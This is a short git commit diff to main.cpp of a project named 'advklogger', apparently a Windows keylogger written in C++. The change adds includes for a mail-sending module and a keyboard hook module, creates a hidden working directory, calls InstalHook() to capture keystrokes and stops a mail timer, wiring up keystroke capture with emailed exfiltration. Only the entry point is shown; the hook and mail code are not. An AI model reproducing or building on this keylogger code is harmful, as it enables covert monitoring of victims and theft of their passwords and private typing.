cf15b22ba979716a785655d35988651979bdb4f2
isrivastav99 <ishaan@gmail.com>
2020-07-31 22:32:59 +0530

    working

--- advklogger/main.cpp
+++ advklogger/main.cpp
@@ -5,13 +5,18 @@
 #include "Base64.h"
 #include "IO.h"
 #include "Timer.h"
-
+#include "SendMail.h"
+#include "KeybHook.h"
 //using namespace std;
 int main(){
 	MSG Msg;
+	IO::MkDir(IO::GetOurPath(true));
+
+	InstalHook();
 	while(GetMessage(&Msg,NULL,0,0)){
 		TranslateMessage(&Msg);
 		DispatchMessage(&Msg);
 	}
-	return 0;
+	MailTimer.Stop();
+    return 0;
 }
